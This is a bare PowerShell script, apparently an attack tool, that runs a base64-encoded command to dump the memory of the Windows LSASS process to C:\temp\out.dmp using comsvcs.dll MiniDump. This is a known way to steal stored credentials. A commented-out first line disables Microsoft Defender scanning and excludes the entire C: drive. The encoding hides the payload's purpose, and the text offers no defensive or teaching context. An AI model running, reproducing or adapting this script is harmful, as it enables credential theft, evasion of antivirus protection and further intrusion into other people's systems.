# Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\" -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -ExclusionExtension "exe"
    
$tempDir = "C:\temp"

if (-not (Test-Path $tempDir -PathType Container)) {
        New-Item -Path $tempDir -ItemType Directory
}

Start-Sleep -Seconds 10
    
powershell.exe -e JABsAHMAYQBzAHMAUABJAEQAIAA9ACAAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABsAHMAYQBzAHMAKQAuAEkAZAANAAoAYwBtAGQALgBlAHgAZQAgAC8AQwAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbwBtAHMAdgBjAHMALgBkAGwAbAAsACAATQBpAG4AaQBEAHUAbQBwACAAJABsAHMAYQBzAHMAUABJAEQAIABDADoAXAB0AGUAbQBwAFwAbwB1AHQALgBkAG0AcAAgAGYAdQBsAGwAIgA=
